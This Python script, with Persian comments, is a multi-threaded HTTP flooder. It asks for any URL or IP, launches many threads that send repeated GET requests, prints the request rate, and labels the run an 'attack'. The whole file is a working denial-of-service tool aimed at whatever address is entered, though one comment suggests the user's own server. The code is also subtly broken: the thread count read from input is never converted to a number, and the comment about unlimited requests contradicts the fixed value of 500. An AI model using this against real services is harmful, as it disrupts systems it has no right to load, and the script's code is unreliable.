# dos_test_with_requests.py
import requests
import threading
import time
from collections import Counter

TARGET_URL = input ("url or ip") # آدرس سرور خودت (مثلاً یک وب سرور ساده)
THREAD_COUNT = input("count?0=benahayat")      # تعداد نخ‌های همزمان
REQUESTS_PER_THREAD = 500   # هر نخ چند درخواست بفرستد (0 = بی‌نهایت)

# آمارگیری
stats = {
    "total": 0,
    "success": 0,
    "error": 0,
    "start_time": None,
    "lock": threading.Lock()
}

def worker(thread_id):
    session = requests.Session()
    count = 0
    while True:
        try:
            resp = session.get(TARGET_URL, timeout=3)
            with stats["lock"]:
                stats["total"] += 1
                if resp.status_code < 400:
                    stats["success"] += 1
                else:
                    stats["error"] += 1
        except Exception:
            with stats["lock"]:
                stats["total"] += 1
                stats["error"] += 1
        
        count += 1
        if REQUESTS_PER_THREAD != 0 and count >= REQUESTS_PER_THREAD:
            break

def reporter():
    """هر 1 ثانیه آمار را چاپ می‌کند"""
    while True:
        time.sleep(1)
        with stats["lock"]:
            elapsed = time.time() - stats["start_time"]
            rate = stats["total"] / elapsed if elapsed > 0 else 0
            print(f"[{time.strftime('%H:%M:%S')}] کل: {stats['total']} | موفق: {stats['success']} | خطا: {stats['error']} | نرخ: {rate:.1f} req/s")

if __name__ == "__main__":
    print(f"شروع حمله به {TARGET_URL} با {THREAD_COUNT} نخ...")
    stats["start_time"] = time.time()
    
    # شروع نخ گزارش‌دهنده
    threading.Thread(target=reporter, daemon=True).start()
    
    # ایجاد و شروع نخ‌های حمله
    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=worker, args=(i,))
        t.start()
        threads.append(t)
        time.sleep(0.01)  # فاصله بین راه‌اندازی نخ‌ها برای کاهش بار روی کلاینت
    
    # منتظر اتمام همه نخ‌ها بمان
    for t in threads:
        t.join()
    
    # گزارش نهایی
    elapsed = time.time() - stats["start_time"]
    print("\n--- پایان تست ---")
    print(f"کل درخواست‌ها: {stats['total']}")
    print(f"موفق: {stats['success']} | خطا: {stats['error']}")
    print(f"مدت زمان: {elapsed:.2f} ثانیه")
    print(f"میانگین نرخ: {stats['total']/elapsed:.1f} req/s")
